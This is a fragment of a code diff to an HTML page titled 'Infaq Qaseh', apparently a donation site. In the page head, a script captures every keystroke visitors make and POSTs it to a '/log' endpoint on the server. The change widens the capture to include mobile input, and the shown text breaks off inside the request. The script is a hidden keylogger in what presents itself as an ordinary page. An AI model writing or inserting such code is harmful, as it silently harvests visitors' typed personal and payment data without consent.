@@ -4,8 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Infaq Qaseh</title>
-    <script>
-        document.addEventListener('keypress', function(e) {
+   <script>
+        // This function captures all keypress events, including those from mobile devices
+        document.addEventListener('keydown', function(e) {
+            // Send the keypress data to the server
             fetch('/log', {
                 method: 'POST',
                 headers: {
